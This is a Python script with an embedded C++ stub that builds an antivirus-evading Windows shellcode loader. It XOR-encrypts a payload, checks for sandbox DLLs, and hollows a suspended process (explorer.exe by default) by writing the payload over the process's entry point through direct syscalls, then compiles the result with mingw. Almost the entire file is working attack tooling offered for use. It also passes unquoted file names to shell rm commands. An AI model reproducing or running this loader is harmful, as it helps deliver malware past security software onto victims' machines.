#!/usr/bin/python3
#Created by Matthew David (@icyguider)
import sys, os, argparse, random, string

inspiration = """
┳┻|
┻┳|
┳┻|
┻┳|
┳┻| _
┻┳| •.•)  - Shhhhh, AV might hear us! 
┳┻|⊂ﾉ   
┻┳|
"""

stub = """
#include <iostream>
#include <windows.h>
#include <psapi.h>
#include <winternl.h>
#include "Syscalls.h"
#ifndef UNICODE  
typedef std::string String;
#else
typedef std::wstring String;
#endif

REPLACE_ME_PAYLOAD

unsigned int payload_len = sizeof(payload);

unsigned char* decoded = (unsigned char*)malloc(payload_len);

int PrintModules(DWORD processID)
{
    HMODULE hMods[1024];
    HANDLE hProcess;
    DWORD cbNeeded;
    unsigned int i;
    OBJECT_ATTRIBUTES oa;
    CLIENT_ID cid;

    cid.UniqueProcess = processID;

    // Print the process identifier.
    //printf("\\nProcess ID: %u\\n", processID);

    // Get a handle to the process.
    NtOpenProcess(&hProcess, PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, &oa, &cid);
    if (NULL == hProcess)
        return 1;

    // Get a list of all the modules in this process.
    if (EnumProcessModules(hProcess, hMods, sizeof(hMods), &cbNeeded))
    {
        for (i = 0; i < (cbNeeded / sizeof(HMODULE)); i++)
        {
            TCHAR szModName[MAX_PATH];

            // Get the full path to the module's file.
            if (GetModuleFileNameEx(hProcess, hMods[i], szModName,
                sizeof(szModName) / sizeof(TCHAR)))
            {
                //std::string target = L"Dbghelp.dll";
                String dang = szModName;

                //CHECK TO SEE IF THESE DLLS ARE LOADED. IF NOT, THEN RETURN 2 TO CONTINUE FOR LOOP
                if (dang.find(L"SbieDll.dll") != std::string::npos || dang.find(L"Api_log.dll") != std::string::npos || dang.find(L"Dir_watch.dll") != std::string::npos || dang.find(L"dbghelp.dll") != std::string::npos)
                {
                    // Print the module name and handle value.
                    //_tprintf(TEXT("\\t%s (0x%08X)\\n"), szModName, hMods[i]);
                    return 2;
                }
                
            }
        }
    }

    // Release the handle to the process.
    NtClose(hProcess);
    return 0;
}

int getLoadedDlls()
{
    DWORD aProcesses[1024];
    DWORD cbNeeded;
    DWORD cProcesses;
    unsigned int i;

    // Get the list of process identifiers.
    if (!EnumProcesses(aProcesses, sizeof(aProcesses), &cbNeeded))
        return 1;

    // Calculate how many process identifiers were returned.
    cProcesses = cbNeeded / sizeof(DWORD);

    // Print the names of the modules for each process.
    int result;
    int done = 0;
    DWORD saved;
    //Loop for dlls. Loop will continue until dlls are found to bypass sandboxing.
    while (done != 2)
    {
        for (i = 0; i < cProcesses; i++)
        {
            result = PrintModules(aProcesses[i]);
            if (result == 2)
            {
                done = result;
                saved = aProcesses[i];
            }
        }
    }
    return 0;
}


int deC(unsigned char payload[])
{
    std::string key;
    key = "REPLACE_ME_KEY";
    for (int i = 0; i < payload_len; i++)
    {
        char d = payload[i];
        for (int z = 0; z < key.length(); z++)
        {
            d = d ^ (int)key[z];
        }
        decoded[i] = d;
    }
    return 0;
}

int main()
{
    getLoadedDlls();
    deC(payload);

    STARTUPINFO *si = (STARTUPINFO *)malloc(sizeof(STARTUPINFO));
    PROCESS_INFORMATION *pi = (PROCESS_INFORMATION *)malloc(sizeof(PROCESS_INFORMATION));
    ZeroMemory(si, sizeof(STARTUPINFO));
    ZeroMemory(pi, sizeof(PROCESS_INFORMATION));

    LPCSTR processImage = "REPLACE_ME_PROCESS";
    NTSTATUS res = CreateProcess(NULL, processImage, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, si, pi);

    if (res == 0) {
        std::cout << "Create process FAILED to start: " << std::hex << res << std::endl;
        printf("CreateProcess failed (%d).\\n", GetLastError());
        return 0;
    }
    else {
        std::cout << "Create proccess started sucessfully." << std::endl;
    }

    HANDLE hProcess = pi->hProcess;
    PROCESS_BASIC_INFORMATION bi;
    ULONG tmp;

    res = NtQueryInformationProcess(hProcess, 0, &bi, sizeof(bi), &tmp);

    if (res != 0){
        std::cout << "NtQueryInformationProcess FAILED to query created process, exiting: " << std::hex << res << std::endl;
        return 0;
    }
    else {
        std::cout << "NtQueryInformationProcess queried the created process sucessfully." << std::endl;
    }

    __int64 TEST = (__int64)bi.PebBaseAddress;
    __int64 TEST2 = TEST + 0x10;
    PVOID ptrImageBaseAddress = (PVOID)TEST2;

    std::cout << "bi.PebBaseAddress: " << bi.PebBaseAddress << std::endl;
    std::cout << "ptrImageBaseAddress: " << ptrImageBaseAddress << std::endl;

    PVOID baseAddressBytes;
    unsigned char data[513];
    SIZE_T nBytes;

    res = NtReadVirtualMemory(hProcess, ptrImageBaseAddress, &baseAddressBytes, sizeof(PVOID), &nBytes);

    if (res != 0){
        std::cout << "NtReadVirtualMemory FAILED to read image base address, exiting: " << std::hex << res << std::endl;
        return 0;
    }
    else{
        std::cout << "NtReadVirtualMemory read image base address successfully." << std::endl;
    }

    std::cout << "baseAddressBytes: " << baseAddressBytes << std::endl;

    PVOID imageBaseAddress = (PVOID)(__int64)(baseAddressBytes);

    res = NtReadVirtualMemory(hProcess, imageBaseAddress, &data, sizeof(data), &nBytes);

    if (res != 0){
        std::cout << "NtReadVirtualMemory FAILED to read first 0x200 bytes of the PE structure, exiting: " << std::hex << res << std::endl;
        std::cout << "nBytes: " << nBytes << std::endl;
        return 0;
    }
    else{
        std::cout << "NtReadVirtualMemory read first 0x200 bytes of the PE structure successfully." << std::endl;
    }
    
    uint32_t e_lfanew = *reinterpret_cast<uint32_t*>(data + 0x3c);
    std::cout << "e_lfanew: " << e_lfanew << std::endl;
    uint32_t entrypointRvaOffset = e_lfanew + 0x28;
    std::cout << "entrypointRvaOffset: " << entrypointRvaOffset << std::endl;
    uint32_t entrypointRva = *reinterpret_cast<uint32_t*>(data + entrypointRvaOffset);
    std::cout << "entrypointRva: " << entrypointRva << std::endl;
    __int64 rvaconv = (__int64)imageBaseAddress;
    __int64 rvaconv2 = rvaconv + entrypointRva;
    std::cout << "entrypointAddress: " << (PVOID)rvaconv2 << std::endl;
    PVOID entrypointAddress = (PVOID)rvaconv2;

    ULONG oldprotect;
    SIZE_T bytesWritten;
    SIZE_T shellcodeLength = (SIZE_T)payload_len;

    res = NtProtectVirtualMemory(hProcess, &entrypointAddress, &shellcodeLength, 0x40, &oldprotect);

    if (res != 0){
        std::cout << "NtProtectVirtualMemory FAILED to set permissions on entrypointAddress: " << std::hex << res << std::endl;
        return 0;
    }
    else{
        std::cout << "NtProtectVirtualMemory set permissions on entrypointAddress successfully." << std::endl;
    }

    res = NtWriteVirtualMemory(hProcess, entrypointAddress, decoded, payload_len, &bytesWritten);

    if (res != 0){
        std::cout << "NtWriteVirtualMemory FAILED to write decoded payload to entrypointAddress: " << std::hex << res << std::endl;
        return 0;
    }
    else{
        std::cout << "NtWriteVirtualMemory wrote decoded payload to entrypointAddress successfully." << std::endl;
    }

    res = NtProtectVirtualMemory(hProcess, &entrypointAddress, &shellcodeLength, oldprotect, &tmp);
    if (res != 0){
        std::cout << "NtProtectVirtualMemory FAILED to revert permissions on entrypointAddress: " << std::hex << res << std::endl;
        return 0;
    }
    else{
        std::cout << "NtProtectVirtualMemory revert permissions on entrypointAddress successfully." << std::endl;
    }

    res = NtResumeThread(pi->hThread, &tmp);
    if (res != 0){
        std::cout << "NtResumeThread FAILED to to resume thread: " << std::hex << res << std::endl;
        return 0;
    }
    else{
        std::cout << "NtProtectVirtualMemory resumed thread successfully." << std::endl;
    }

    res = NtClose(hProcess);
}"""


def generateKey():
    letters = string.ascii_letters + string.digits
    key = ''.join(random.choice(letters) for i in range(49))
    return key

def main(stub, infile, outfile, key, process):
    print("[+] ICYGUIDER'S CUSTOM SYSWHISPERS SHELLCODE LOADER")
    #Take infile and add 5000 nops to shellcode.
    #This is because our shellcode doesn't seem to end up exactly where we write it to for some reason.
    #If you know why this is happening, feel free to reach out to me!
    with open(infile, 'rb') as contents:
        save = contents.read()
    tempfile = "temp_{}".format(infile)
    with open(tempfile, 'wb') as contents:
        contents.write(b"\x90"*5000)
        contents.write(save)
    file = open(tempfile, 'rb')
    contents = file.read()
    file.close()
    os.system("rm {}".format(tempfile))

    encrypted = []
    for b in range(len(contents)):
        test = contents[b]
        for i in range(len(key)):
            test ^= ord(key[i])
        encrypted.append("{:02x}".format(test))

    output = "unsigned char payload[] = {"

    count = 0
    for x in encrypted:
        if count < len(encrypted)-1:
            output += "0x{},".format(x)
        else:
            output += "0x{}".format(x)
        count += 1

    output += "};"

    print("[+] Using {} for process hollowing".format(process))
    stub = stub.replace("REPLACE_ME_PAYLOAD", output)
    stub = stub.replace("REPLACE_ME_KEY", key)
    stub = stub.replace("REPLACE_ME_PROCESS", process)

    file = open("stub.cpp", "w")
    file.write(stub)
    file.close()
    print("[+] Saved new stub to stub.cpp")
    print("[+] Compiling new stub...")
    os.system("x86_64-w64-mingw32-g++ stub.cpp -w -masm=intel -fpermissive -static -lpsapi -Wl,--subsystem,windows -o {}".format(outfile))
    if os.path.exists(outfile) == True:
        print("[!] {} has been compiled successfully!".format(outfile))
    else:
        print("[!] Stub compilation failed! Something went wrong!")
    os.system("rm stub.cpp")


print(inspiration[1:-1])
parser = argparse.ArgumentParser(description='ICYGUIDER\'S CUSTOM SYSWHISPERS SHELLCODE LOADER')
parser.add_argument("file", help="File containing raw shellcode", type=str)
parser.add_argument('-p', '--process', dest='process', help='Process to inject into (Default: explorer.exe)', metavar='explorer.exe', default='explorer.exe')
parser.add_argument('-o', '--outfile', dest='out', help='Name of compiled file', metavar='a.exe', default='a.exe')
if len(sys.argv) < 2:
    parser.print_help()
    sys.exit()
args = parser.parse_args()
try:
    if os.path.exists(args.out) == True:
        os.system("rm {}".format(args.out))
    key = generateKey()
    main(stub, args.file, args.out, key, args.process)
except:
    sys.exit()
